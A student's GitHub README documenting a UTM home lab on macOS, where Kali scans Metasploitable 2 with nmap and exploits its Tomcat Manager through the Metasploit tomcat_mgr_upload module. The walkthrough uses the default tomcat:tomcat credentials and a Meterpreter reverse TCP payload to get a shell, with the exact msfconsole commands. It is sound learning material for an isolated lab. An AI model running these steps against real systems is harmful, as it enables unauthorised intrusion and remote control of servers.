# 🔐 Cyber Home Lab with Kali, Metasploitable & Windows 11 (UTM-based)

This is a personal cybersecurity home lab built on a Mac M2 using UTM. It simulates a real-world vulnerable environment for ethical hacking, network scanning, and exploitation using tools like **Nmap** and **Metasploit**.

## 🧰 Lab Setup

- **Host Machine:** macOS (M2, 16GB RAM)
- **Virtualization:** [UTM](https://mac.getutm.app/)
- **Virtual Machines:**
  - Kali Linux (Attacker)
  - Metasploitable 2 (Target)
  - Windows 11 (Optional victim/client)
- **Network Mode:** Bridged (All VMs share same local subnet)

## 🧪 Objective

1. Scan a vulnerable machine (Metasploitable)
2. Identify services and open ports
3. Exploit using known vulnerabilities
4. Gain a reverse shell using Metasploit

---

## 🔍 Step 1: Nmap Scan

**Command used:**
```bash
nmap -A 192.168.1.15 > metasploitable-nmap.txt
```
<a href="https://github.com/daksh20031231/cyber_lab_project/blob/main/metasploitable-nmap.txt">📄 View Full Scan Output</a>

---

## 🎯 Step 2: Exploiting Apache Tomcat with Metasploit

Metasploitable runs a vulnerable Apache Tomcat Manager on port 8180 using default credentials (tomcat:tomcat). We use Metasploit to exploit it.

**Metasploit Module:**
```bash
exploit/multi/http/tomcat_mgr_upload
```
**Payload:**
```bash
java/meterpreter/reverse_tcp
```
**Exploit Steps:**
```bash
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.15
set RPORT 8180
set HTTPUSERNAME tomcat
set HTTPPASSWORD tomcat
set payload java/meterpreter/reverse_tcp
set LHOST 192.168.1.16  # Kali's IP
run
```

✅ Reverse shell session opened!

**🖥️ Meterpreter Shell Info**

After exploitation, I obtained a Meterpreter shell on the target system.

```Commands Run:
whoami       
uname -a     
id           
```
---

## 🧠 Key Learnings
1) UTM works great for local cyber labs on macOS
2) Bridged networking is essential for real communication between VMs
3) Nmap is powerful for initial recon and service detection
4) Metasploit automates real-world attacks with minimal configuration
5) Apache Tomcat’s default credentials are a serious security flaw

---

## 🛡️ Disclaimer
This project is created for educational purposes only.
All virtual machines are hosted and tested in a local isolated environment.
Never attempt to scan, exploit, or attack any system without explicit permission.

---

## 👤 Author
<strong>Daksh Sharma</strong><br>
Cybersecurity Enthusiast | Ethical Hacking Learner <br>
📍 Built with ❤️ using UTM on macOS




